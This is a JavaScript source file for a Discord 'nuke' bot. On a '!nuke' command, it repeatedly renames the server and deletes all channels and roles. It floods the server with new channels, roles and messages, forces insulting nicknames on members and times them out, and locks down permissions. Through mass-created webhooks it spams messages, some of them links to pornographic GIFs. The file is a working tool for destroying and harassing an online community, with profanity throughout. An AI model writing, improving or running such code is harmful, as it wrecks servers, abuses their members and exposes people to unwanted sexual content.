require('dotenv').config();
const { Client, GatewayIntentBits, ChannelType, PermissionFlagsBits, Colors } = require('discord.js');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildVoiceStates,
    GatewayIntentBits.GuildModeration,
  ],
});

// ================== CONFIG ==================
const TOKEN = process.env.TOKEN;
const TARGET_GUILD_ID = process.env.TARGET_GUILD_ID || null;
const PROTECTED_CHANNEL = 'aaaaaaaa';

const NUKE_DURATION = 10 * 60 * 1000;
const TICK_INTERVAL = 7 * 1000;
let nukeActive = false;
let nukeTimeout = null;
let currentPhase = 1;

// ================== GIF SLOTS ==================
const GIF_TYPE_1 = [
  "https://klipy.com/gifs/orgasm-cumming-1"
];

const GIF_TYPE_2 = [
  "https://klipy.com/gifs/vegan-porn-carrot-porn"
];

// ================== LISTS ==================
const SERVER_NAMES = [
  'NUKED', 'HALLUCINATION', 'SERVER DEAD', 'OWNED', 'RIP', 'GET FUCKED',
  'NO SURVIVORS', 'BOT WON', 'DESTROYED', 'GOODBYE', 'MINIONS ACTIVE',
  'REALITY BROKEN', 'CHAOS OVERLOAD', '10 MIN NUKE', 'TOTAL COLLAPSE',
  'FINAL STAGE', 'NO ESCAPE', 'MINION ARMY', 'WEBHOOK ARMY', 'ARMY ONLINE',
  'BOSS UPGRADED', 'OVERLORD MODE', 'FULL PRESSURE'
];

const CHANNEL_NAMES = [
  'nuked', 'destroyed', 'owned', 'rip', 'get-fucked', 'dead', 'chaos', 'void',
  'pain', 'end', 'lmao', 'gg', 'bot-was-here', 'no-escape', 'server-corpse',
  'extreme-nuke', 'minion-zone', 'hallucination', 'glitch', 'error', 'deleted',
  'why', 'mute-zone', 'screaming', 'help', 'pain-chamber', 'final',
  'minion-spam', 'boss-room', 'collapse', 'broken', 'army', 'flood', 'wave',
  'boss-flood', 'overlord', 'pressure', 'kill-zone'
];

const NICKNAMES = [
  'NUKED', 'OWNED', 'RIP', 'GET FUCKED', 'BOT PROPERTY', 'NO HOPE',
  'DESTROYED', 'SERVER CORPSE', 'VICTIM', 'MINION FOOD', 'MUTED',
  'SILENCED', 'BROKEN', 'ARMY TARGET', 'WEBHOOK VICTIM', 'BOSS TARGET',
  'OVERLORD VICTIM', 'PRESSURED'
];

const ROLE_NAMES = [
  'Nuked', 'Owned', 'Destroyed', 'RIP', 'Bot Property', 'No Hope', 'Minion',
  'Glitch', 'Muted', 'Silenced', 'Chaos', 'Victim', 'Army', 'Flooded',
  'Boss Marked', 'Overlord', 'Pressure', 'Doomed'
];

const MESSAGES = [
  '**WEBHOOK ARMY ONLINE**', 'SERVER IS DEAD', 'GET FUCKED', 'NO SURVIVORS',
  'OWNED', 'THE END', 'RIP SERVER', 'YOU CANNOT STOP THIS', 'BOT WINS',
  'GOODBYE', 'MINIONS ARE HELPING', 'ARMY INCOMING', 'TOO MANY WEBHOOKS',
  'MUTED', 'SILENCE', '10 MINUTES OF PAIN', 'NO ESCAPE', 'ARMY OVERWHELM',
  'BOSS UPGRADED', 'FULL PRESSURE', 'OVERLORD MODE', 'FEEL THE BOSS'
];

const ARMY_NAMES = [
  'Minion', 'Army-1', 'Army-2', 'Flood', 'Screamer', 'Null', 'Hunter',
  'Breaker', 'Spammer', 'Ghost', 'Drone', 'Wave', 'Chaos', 'Destroyer',
  'Pain', 'Void', 'Error', 'Slave', 'Glitch', 'Overlord'
];

const ARMY_MESSAGES = [
  'army reporting', 'wave incoming', 'you are done', 'boss ordered this',
  'no survivors', 'mute activated', 'gif spam', 'reality break',
  'webhook army', 'too many of us', 'flooding now', 'phase shift',
  'we are many', 'no hope', 'collapse', 'army online', 'boss is stronger'
];

// ================== HELPERS ==================
function randomItem(arr) {
  if (!arr || arr.length === 0) return null;
  return arr[Math.floor(Math.random() * arr.length)];
}

function chance(percent) {
  return Math.random() * 100 < percent;
}

function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

async function getOrCreateWebhook(channel, name = 'Minion') {
  try {
    const webhooks = await channel.fetchWebhooks();
    let webhook = webhooks.find(wh => wh.name === name);
    if (!webhook) {
      webhook = await channel.createWebhook({
        name: name,
        reason: 'Webhook Army',
      });
    }
    return webhook;
  } catch (err) {
    return null;
  }
}

async function safeDelete(channel) {
  if (!channel || channel.name === PROTECTED_CHANNEL) return;
  await channel.delete('WEBHOOK ARMY NUKE').catch(() => {});
}

// ================== UPGRADED BOSS ACTIONS ==================
const bossActions = [
  // Server rename
  async (guild) => {
    await guild.setName(randomItem(SERVER_NAMES)).catch(() => {});
    console.log('🔥 Boss renamed server');
  },

  // Mass channel delete
  async (guild) => {
    const channels = [...guild.channels.cache.values()];
    for (const channel of channels) await safeDelete(channel);
    console.log('🗑️ Boss mass deleted channels');
  },

  // Heavy channel flood
  async (guild) => {
    for (let i = 0; i < 10; i++) {
      try {
        const ch = await guild.channels.create({
          name: randomItem(CHANNEL_NAMES),
          type: ChannelType.GuildText,
        });
        await ch.send(randomItem(MESSAGES)).catch(() => {});
      } catch (e) {}
    }
    console.log('✨ Boss heavy channel flood');
  },

  // Create + quick delete (pressure)
  async (guild) => {
    for (let i = 0; i < 6; i++) {
      try {
        const ch = await guild.channels.create({
          name: randomItem(['temp', 'flash', 'glitch', 'army', 'wave', 'pressure']),
          type: ChannelType.GuildText,
        });
        await ch.send('👁 BOSS').catch(() => {});
        setTimeout(() => ch.delete().catch(() => {}), 3500 + Math.random() * 4000);
      } catch (e) {}
    }
  },

  // Delete all roles
  async (guild) => {
    const roles = [...guild.roles.cache.values()];
    for (const role of roles) {
      if (role.id === guild.id || !role.editable) continue;
      await role.delete('BOSS UPGRADE').catch(() => {});
    }
    console.log('🗑️ Boss deleted roles');
  },

  // Create many roles
  async (guild) => {
    for (let i = 0; i < 9; i++) {
      await guild.roles.create({
        name: randomItem(ROLE_NAMES),
        color: randomItem([Colors.Red, Colors.DarkRed, Colors.Purple, Colors.Orange, Colors.Fuchsia]),
        reason: 'BOSS UPGRADE',
      }).catch(() => {});
    }
  },

  // Nickname hell
  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    for (const member of members.values()) {
      if (member.user.bot || !member.manageable) continue;
      await member.setNickname(randomItem(NICKNAMES)).catch(() => {});
    }
    console.log('👤 Boss nickname hell');
  },

  // Mute hell (upgraded)
  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    for (const member of members.values()) {
      if (member.user.bot || !member.moderatable) continue;
      const time = [300, 600, 900, 1800, 3600, 7200][Math.floor(Math.random() * 6)] * 1000;
      await member.timeout(time, 'BOSS UPGRADE - MUTED').catch(() => {});
    }
    console.log('⏳ Boss mute hell');
  },

  // Message spam
  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.SendMessages)
    );
    for (const channel of channels.values()) {
      for (let i = 0; i < 6; i++) {
        await channel.send(randomItem(MESSAGES)).catch(() => {});
      }
    }
  },

  // Permission destruction
  async (guild) => {
    const channels = guild.channels.cache.filter(c => c.manageable);
    for (const channel of channels.values()) {
      await channel.permissionOverwrites.edit(guild.roles.everyone, {
        ViewChannel: chance(15),
        SendMessages: false,
        Connect: false,
        Speak: false,
        AddReactions: false,
        AttachFiles: false,
        EmbedLinks: false,
      }).catch(() => {});
    }
    console.log('🔐 Boss permission destruction');
  },

  // Boss nickname
  async (guild) => {
    await guild.members.me.setNickname(randomItem([
      'WEBHOOK ARMY', 'ARMY COMMANDER', 'MINION BOSS', 'NUKE BOSS',
      'OVERLORD', 'BOSS UPGRADED', 'FULL PRESSURE', 'THE DESTROYER'
    ])).catch(() => {});
  },

  // Category chaos
  async (guild) => {
    for (let i = 0; i < 4; i++) {
      try {
        const cat = await guild.channels.create({
          name: randomItem(['BOSS ZONE', 'ARMY BASE', 'PRESSURE', 'VOID', 'OVERLORD', 'FINAL']),
          type: ChannelType.GuildCategory,
        });
        setTimeout(() => cat.delete().catch(() => {}), 10000 + Math.random() * 15000);
      } catch (e) {}
    }
  },

  // Role assign hell (new)
  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    const roles = [...guild.roles.cache.filter(r => r.editable && r.id !== guild.id).values()];
    if (!members || roles.length === 0) return;

    for (const member of members.values()) {
      if (member.user.bot || !member.manageable) continue;
      const role = randomItem(roles);
      if (role) await member.roles.add(role).catch(() => {});
    }
    console.log('🎭 Boss role assign hell');
  },

  // Double pressure: nickname + mute
  async (guild) => {
    const members = await guild.members.fetch().catch(() => null);
    if (!members) return;
    for (const member of members.values()) {
      if (member.user.bot) continue;
      if (member.manageable) await member.setNickname(randomItem(NICKNAMES)).catch(() => {});
      if (member.moderatable) {
        await member.timeout(600000, 'BOSS DOUBLE PRESSURE').catch(() => {});
      }
    }
    console.log('💀 Boss double pressure');
  },
];

// ================== WEBHOOK ARMY SYSTEM ==================
const armyActions = [
  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
    );
    for (const channel of channels.values()) {
      for (const name of ARMY_NAMES.slice(0, 8)) {
        const webhook = await getOrCreateWebhook(channel, name);
        if (!webhook) continue;
        for (let i = 0; i < 3; i++) {
          const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
          await webhook.send({
            content: gif || randomItem(ARMY_MESSAGES),
            username: name,
          }).catch(() => {});
        }
      }
    }
    console.log('👾 WEBHOOK ARMY GIF WAVE');
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
    );
    for (const channel of channels.values()) {
      for (let i = 0; i < 5; i++) {
        const webhook = await getOrCreateWebhook(channel, randomItem(ARMY_NAMES));
        if (!webhook) continue;
        await webhook.send({
          content: randomItem(ARMY_MESSAGES),
          username: randomItem(ARMY_NAMES),
        }).catch(() => {});
      }
    }
    console.log('👾 WEBHOOK ARMY TEXT FLOOD');
  },

  async (guild) => {
    for (let i = 0; i < 4; i++) {
      try {
        const ch = await guild.channels.create({
          name: randomItem(['army-spam', 'wave', 'flood-zone', 'minion-army', 'webhook-hell']),
          type: ChannelType.GuildText,
        });
        for (const name of ARMY_NAMES.slice(0, 4)) {
          const webhook = await getOrCreateWebhook(ch, name);
          if (!webhook) continue;
          for (let j = 0; j < 3; j++) {
            const gif = Math.random() < 0.5 ? randomItem(GIF_TYPE_1) : randomItem(GIF_TYPE_2);
            await webhook.send({
              content: gif || randomItem(ARMY_MESSAGES),
              username: name,
            }).catch(() => {});
          }
        }
      } catch (e) {}
    }
    console.log('👾 ARMY CREATED SPAM CHANNELS');
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c => c.type === ChannelType.GuildText);
    for (const channel of channels.values()) {
      const webhook = await getOrCreateWebhook(channel, 'Glitch');
      if (!webhook) continue;
      await webhook.send({
        content: randomItem(['👁', '💀', '🔥', '⚠️', '☠️', '💥', '🌀', '❌', '🩸', '⚔️']),
        username: randomItem(['Glitch', 'Null', 'Error', 'Void']),
      }).catch(() => {});
    }
  },

  async (guild) => {
    const channels = guild.channels.cache.filter(c =>
      c.type === ChannelType.GuildText &&
      c.permissionsFor(guild.members.me)?.has(PermissionFlagsBits.ManageWebhooks)
    );
    for (const channel of channels.values()) {
      const webhook = await getOrCreateWebhook(channel, 'Hunter');
      if (!webhook) continue;
      await webhook.send({
        content: randomItem([
          'ARMY WAVE INCOMING',
          'TOO MANY WEBHOOKS',
          'YOU CANNOT STOP THE ARMY',
          'PHASE OVERLOAD',
          'WEBHOOK ARMY ACTIVE',
          'MINIONS EVERYWHERE',
          'BOSS IS STRONGER NOW'
        ]),
        username: 'Hunter',
      }).catch(() => {});
    }
  },
];

// ================== MAIN TICK ==================
async function runNukeTick(guild) {
  if (!guild || !guild.members.me.permissions.has(PermissionFlagsBits.Administrator)) {
    console.log('⚠️ Missing Administrator permission');
    return;
  }

  console.log(`\n======== WEBHOOK ARMY + UPGRADED BOSS TICK on ${guild.name} ========`);

  const selectedBoss = [...bossActions].sort(() => 0.5 - Math.random()).slice(0, 9);
  for (const action of selectedBoss) {
    try {
      await action(guild);
      await sleep(90);
    } catch (err) {
      console.error('❌ Boss:', err.message);
    }
  }

  const selectedArmy = [...armyActions].sort(() => 0.5 - Math.random()).slice(0, 4);
  for (const action of selectedArmy) {
    try {
      await action(guild);
      await sleep(80);
    } catch (err) {
      console.error('❌ Army:', err.message);
    }
  }
}

// ================== START / STOP ==================
async function startNuke(guild, message) {
  if (nukeActive) {
    if (message) await message.reply('⚠️ Nuke already running.');
    return;
  }

  nukeActive = true;
  if (message) await message.reply('💣 **WEBHOOK ARMY + UPGRADED BOSS NUKE STARTED**');

  console.log('💣 WEBHOOK ARMY + UPGRADED BOSS NUKE STARTED');

  await runNukeTick(guild);

  const interval = setInterval(async () => {
    if (!nukeActive) return clearInterval(interval);
    await runNukeTick(guild);
  }, TICK_INTERVAL);

  nukeTimeout = setTimeout(() => {
    nukeActive = false;
    clearInterval(interval);
    console.log('🛑 NUKE ENDED');
  }, NUKE_DURATION);
}

// ================== EVENTS ==================
client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
  console.log(`💣 WEBHOOK ARMY + UPGRADED BOSS READY`);
});

client.on('messageCreate', async (message) => {
  if (message.author.bot || !message.guild) return;
  if (!message.member.permissions.has(PermissionFlagsBits.Administrator)) return;

  if (message.content === '!nuke') {
    await startNuke(message.guild, message);
  }

  if (message.content === '!nuke-stop') {
    nukeActive = false;
    if (nukeTimeout) clearTimeout(nukeTimeout);
    await message.reply('🛑 Nuke stopped.');
  }
});

client.login(TOKEN);
